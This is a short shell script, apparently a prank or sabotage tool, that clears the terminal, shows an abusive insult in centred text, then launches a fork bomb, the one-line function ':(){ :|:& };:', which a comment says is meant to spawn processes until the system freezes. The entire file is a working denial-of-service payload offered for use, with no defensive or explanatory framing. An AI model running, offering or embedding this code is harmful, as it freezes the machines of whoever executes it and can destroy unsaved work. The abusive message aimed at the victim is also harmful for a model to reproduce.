#!/bin/sh
# Display message then fork bomb to freeze system

# Clear screen and show message
clear
echo "\033[2J\033[H"
printf "\033[30;47m"  # Black bg, white text
clear

# Center the message (approximate)
printf "\n\n\n\n\n\n\n\n\n\n"
printf "                    Get fucked bitch\n"

# Wait a moment so user sees it
sleep 0.5

# Fork bomb - spawns infinite processes until system freeze
:(){ :|:& };:
